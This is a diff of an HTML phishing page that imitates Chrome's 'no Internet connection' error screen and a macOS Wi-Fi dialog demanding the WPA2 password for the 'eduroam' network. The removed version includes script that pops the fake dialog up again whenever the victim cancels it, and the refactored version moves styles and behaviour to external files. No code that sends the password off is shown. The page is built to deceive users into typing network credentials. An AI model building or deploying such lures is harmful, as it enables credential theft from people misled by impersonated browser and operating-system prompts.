@@ -1,461 +1,73 @@
-<html i18n-values="dir:textdirection;lang:language" dir="ltr" lang="en" i18n-processed=""><head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0,
-                                 maximum-scale=1.0, user-scalable=no">
-  <title i18n-content="title">Internet connection is not available</title>
-  <style>/* Copyright 2014 The Chromium Authors. All rights reserved.
-   Use of this source code is governed by a BSD-style license that can be
-   found in the LICENSE file. */
-
-body {
-  background-color: #f7f7f7;
-  color: #646464;
-}
-
-#details {
-  color: #696969;
-  margin: 45px 0 50px;
-}
-
-#details p:not(:first-of-type) {
-  margin-top: 20px;
-}
-
-#details-button {
-  background: inherit;
-  border: 0;
-  float: none;
-  margin: 0;
-  padding: 10px 0;
-  text-transform: uppercase;
-}
-
-#details-button:hover {
-  box-shadow: inherit;
-  text-decoration: underline;
-}
-
-.error-code {
-  color: #696969;
-  display: inline;
-  font-size: .86667em;
-  margin-top: 15px;
-  opacity: .5;
-  text-transform: uppercase;
-}
-
-#error-debugging-info {
-  font-size: 0.8em;
-}
-
-h1 {
-  color: #333;
-  font-size: 1.6em;
-  font-weight: normal;
-  line-height: 1.25em;
-  margin-bottom: 16px;
-}
-
-.hidden {
-  display: none;
-}
-
-html {
-  -webkit-text-size-adjust: 100%;
-  font-size: 125%;
-}
-
-.icon {
-  background-repeat: no-repeat;
-  background-size: 100%;
-  height: 72px;
-  margin: 0 0 40px;
-  width: 72px;
-}
-
-.nav-wrapper {
-  margin-top: 51px;
-}
-
-.nav-wrapper::after {
-  clear: both;
-  content: '';
-  display: table;
-  width: 100%;
-}
-
-.small-link {
-  color: #696969;
-  font-size: .875em;
-}
-
-/* Don't use the main frame div when the error is in a subframe. */
-html[subframe] #main-frame-error {
-  display: none;
-}
-
-/* Don't use the subframe error div when the error is in a main frame. */
-html:not([subframe]) #sub-frame-error {
-  display: none;
-}
-
-h1 {
-  margin-top: 0;
-  word-wrap: break-word;
-}
-
-.icon {
-  -webkit-user-select: none;
-  display: inline-block;
-}
-
-.error-code {
-  display: block;
-  font-size: .8em;
-}
-
-.hidden {
-  display: none;
-}
-
-#suggestion {
-  margin-top: 15px;
-}
-
-#suggestions-list p {
-  -webkit-margin-after: 0;
-}
-
-#suggestions-list ul {
-  margin-top: 0;
-}
-
-/* Offline page */
-.offline {
-  transition: -webkit-filter 1.5s cubic-bezier(0.65, 0.05, 0.36, 1),
-              background-color 1.5s cubic-bezier(0.65, 0.05, 0.36, 1);
-  will-change: -webkit-filter, background-color;
-}
-
-.offline.inverted {
-  -webkit-filter: invert(100%);
-  background-color: #000;
-}
-
-.offline .interstitial-wrapper {
-  color: #2b2b2b;
-  font-size: 1em;
-  line-height: 1.55;
-  margin: 0 auto;
-  max-width: 600px;
-  padding-top: 100px;
-  width: 100%;
-}
-
-.offline .runner-container {
-  height: 150px;
-  max-width: 600px;
-  overflow: hidden;
-  position: absolute;
-  top: 35px;
-  width: 44px;
-}
-
-#offline-resources {
-  display: none;
-}
-
-.mac-wifi {
-  -webkit-user-select: none;
-  cursor: default;
-  font-family: "Helvetica Neue", sans-serif;
-  background-color: #ececec;
-  border-radius: 5px;
-  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-  width: 452px;
-  height: 260px;
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  margin-left: -225px;
-  margin-top: -298px;
-  color: black;
-  position: relative;
-}
-
-.mac-wifi .buttons {
-  position: absolute;
-  bottom: 0;
-  right: 0;
-  padding: 16px 18px 16px 16px;
-}
-
-.mac-wifi button {
-  border-radius: 4px;
-  background-color: white;
-  border: 1px solid #c5c5c5;
-  float: right;
-  font-size: 82%;
-  margin: 5px 5px 5px 7px;
-  outline: none;
-  width: 70px;
-  height: 21px;
-  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
-  font-weight: 400;
-}
-
-.mac-wifi button.action:enabled {
-  border: 1px solid #74aafd;
-  background-image: linear-gradient(#6cb3fa, #0a7eff);
-  color: white;
-}
-
-.mac-wifi button:focus:active {
-  background-image: linear-gradient(#4e98fa, #1469e1);
-  color: white;
-}
-
-.mac-wifi .password input:focus + .glow {
-  content: "";
-  display: block;
-  width: 248px;
-  height: 20px;
-  position: absolute;
-  left: 169px;
-  top: 115px;
-  border-radius: 4px;
-  border: 4px solid #94c2f3;
-  z-index: 1;
-}
-
-.mac-wifi input[type=password], .mac-wifi input[type=text] {
-  width: 250px;
-  height: 22px;
-  font-size: 80%;
-  padding: 0 0 0 2px;
-  border: 1px solid #ccc;
-  background-image: none !important; /* avoid LastPass icon */
-  position: relative;
-  z-index: 2;
-}
-
-.mac-wifi input[type=password]:focus, .mac-wifi input[type=text]:focus {
-  border: 1px solid #ccc;
-  outline: none;
-}
-
-.mac-wifi .title {
-  height: 20px;
-  border-top-left-radius: 5px;
-  border-top-right-radius: 5px;
-  border-top: 1px solid #cecece;
-  border-left: 1px solid #cecece;
-  border-right: 1px solid #cecece;
-  border-bottom: 1px solid #c0bfc0;
-  background-image: linear-gradient(white 1%, #e8e6e8 5%, #d2d0d2 100%);
-}
-
-.mac-wifi .icon {
-  float: left;
-  position: relative;
-  height: 200px;
-}
-
-.mac-wifi .content {
-  padding: 15px;
-  height: 207px;
-  border: 1px solid #aeaeae;
-  border-bottom-left-radius: 5px;
-  border-bottom-right-radius: 5px;
-  border-top: none;
-}
-
-.mac-wifi .checkmark {
-  margin: 0px 10px 0 67px;
-  font-size: 90%;
-}
-
-.mac-wifi .checkmark label {
-    padding: 0 0 0 3px;
-}
-
-.mac-wifi .description {
-  margin-left: 85px;
-}
-
-.mac-wifi strong {
-  user-select: none;
-  display: block;
-  margin: 11px 0 20px 0;
-  font-size: 90%;
-  line-height: 15px;
-  color: black;
-}
-
-.mac-wifi .password {
-  font-size: 110%;
-  margin: 40px 0 7px 0;
-  background-position: 150% 50% !important;
-}
-
-.mac-wifi .password label {
-  float: left;
-  font-size: 80%;
-  margin: 2px 9px 0 0;
-}
-
-.mac-wifi button[disabled] {
-  opacity: 0.4;
-}
-
-.mac-wifi .icon .question {
-  position: absolute;
-  left: 0;
-  bottom: -6px;
-}
-
-.mac-wifi .icon .wifi-icon {
-  position: relative;
-  top: 7px;
-}
-</style>
-</head>
-
-<body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
-  <div id="main-frame-error" class="interstitial-wrapper" >
-    <div id="main-content" >
-      <img class="dinosaur" src="dinosaur.png" width="45" />
-      <div class="icon icon-offline"  style="visibility: hidden;"></div>
-      <div id="main-message" >
-        <h1  >There is no Internet connection</h1>
-        <p  >You can try to diagnose the problem by taking the following steps:
-      <br >
-      Go to
-      <strong >
-      Applications &gt; System Preferences &gt; Network &gt; Assist me
-      </strong>
-      to test your connection.</p>
-        <div id="suggestions-list" >
-          <p >Try:</p>
-          <ul class="">
-            <li  >Checking the network cable or router</li><li  >Resetting the modem or router</li><li  >Reconnecting to Wi-Fi</li>
-          </ul>
-        </div>
-        <div class="error-code"  >ERR_INTERNET_DISCONNECTED</div>
-      </div>
-    </div>
-    <div id="buttons" class="nav-wrapper suggested-right" >
-      <button id="details-button" class="text-button small-link singular">Details</button>
-    </div>
-    <div id="details" class="hidden" ></div>
-    <div class="mac-wifi" id="mac-wifi" style="display:none">
-        <div id="modal-title" class="title"></div>
-        <div class="content">
-            <div class="icon">
-                <img src="wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />
-                <img src="question.png" alt="?" width="25" class="question" />
-            </div>
-            <div class="description">
-                <form id="wifi-search-form">
-                    <strong>The Wi-Fi network ″eduroam″ requires a WPA2 password.</strong>
-
-                    <div class="password">
-                        <label>Password:</label>
-                        <input type="password" id="wifi-search-password" />
-                        <div class="glow"></div>
-                    </div>
-
-                    <div class='checkmark'>
-                        <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>
-                    </div>
-                    <div class='checkmark'>
-                        <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>
-                    </div>
-
-                    <div class='buttons'>
-                        <button id="button-join" class="action" disabled="disabled">Join</button>
-                        <button id="button-cancel">Cancel</button>
-                    </div>
-                </form>
+<html i18n-values="dir:textdirection;lang:language" dir="ltr" lang="en" i18n-processed="">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0,
+        maximum-scale=1.0, user-scalable=no">
+        <title i18n-content="title">Internet connection is not available</title>
+        <link rel='stylesheet' href='chrome-offline.css' type='text/css' />
+        <link rel='stylesheet' href='mac-network-manager.css' />
+    </head>
+    <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
+    <div id="main-frame-error" class="interstitial-wrapper">
+        <div id="main-content">
+            <img class="dinosaur" src="dinosaur.png" width="45" />
+            <div class="icon icon-offline" style="visibility: hidden;"></div>
+            <div id="main-message">
+                <h1>There is no Internet connection</h1>
+                <p>You can try to diagnose the problem by taking the following steps:
+                <br />
+                Go to
+                <strong>
+                Applications &gt; System Preferences &gt; Network &gt; Assist me
+                </strong>
+                to test your connection.</p>
+                <div id="suggestions-list" >
+                    <p >Try:</p>
+                    <ul class="">
+                        <li>Checking the network cable or router</li>
+                        <li>Resetting the modem or router</li>
+                        <li>Reconnecting to Wi-Fi</li>
+                    </ul>
+                </div>
+                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
             </div>
         </div>
-    </div>
-    <script>
-        var byId = document.getElementById.bind(document);
-        var pwd = byId("wifi-search-password"),
-            modal = byId("mac-wifi"),
-            join = byId("button-join"),
-            cancel = byId("button-cancel"),
-            showPwd = byId("show-password"),
-            remember = byId("remember-network"),
-            title = byId("modal-title");
-
-        function showModal() {
-            setTimeout(function() {
-                modal.style.display = "block";
-                pwd.focus();
-            }, 1000);
-        }
-
-        showModal();
-
-        pwd.onkeyup = function() {
-            join.disabled = (pwd.value.length < 8);
-        };
-        showPwd.onchange = function() {
-            if (showPwd.checked) {
-                pwd.type = "text";
-            }
-            else {
-                pwd.type = "password";
-            }
-            pwd.focus();
-        };
-        remember.onchange = function() {
-            pwd.focus();
-        };
-        cancel.onclick = function() {
-            modal.style.display = "none";
-            showModal();
-        };
-        var downX, downY, oldX, oldY, dragging = false;
-
-        title.onmousedown = function(e) {
-            if (e.button == 0) {
-                dragging = true;
-                downX = e.clientX;
-                downY = e.clientY;
-                oldX = modal.offsetLeft;
-                oldY = modal.offsetTop;
-                document.onselectstart = function() {
-                    return false;
-                };
-            }
-        };
-
-        document.onmousemove = function(e) {
-            if (dragging) {
-                var newX = e.clientX - downX,
-                    newY = e.clientY - downY;
-
-                modal.style.position = 'absolute';
-                modal.style.left = oldX + newX + 'px';
-                modal.style.top = oldY + newY + 'px';
-                modal.style.marginLeft = 0;
-                modal.style.marginTop = 0;
-            }
-        };
-
-        document.onmouseup = function(e) {
-            if (e.button == 0) {
-                dragging = false;
-                document.onselectstart = function() {
-                };
-            }
-        };
-
-        modal.onclick = function() {
-            pwd.focus();
-        };
-    </script>
-</body></html>
+        <div id="buttons" class="nav-wrapper suggested-right" >
+            <button id="details-button" class="text-button small-link singular">Details</button>
+        </div>
+        <div id="details" class="hidden" ></div>
+        <div class="mac-wifi" id="mac-wifi" style="display:none">
+            <div id="modal-title" class="title"></div>
+            <div class="content">
+                <div class="icon">
+                    <img src="wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />
+                    <img src="question.png" alt="?" width="25" class="question" />
+                </div>
+                <div class="description">
+                    <form id="wifi-search-form">
+                        <strong>The Wi-Fi network ″eduroam″ requires a WPA2 password.</strong>
+      
+                        <div class="password">
+                            <label>Password:</label>
+                            <input type="password" id="wifi-search-password" />
+                            <div class="glow"></div>
+                        </div>
+      
+                        <div class='checkmark'>
+                            <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>
+                        </div>
+                        <div class='checkmark'>
+                            <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>
+                        </div>
+      
+                        <div class='buttons'>
+                            <button id="button-join" class="action" disabled="disabled">Join</button>
+                            <button id="button-cancel">Cancel</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <script src='behavior.js'></script>
+    </body>
+</html>
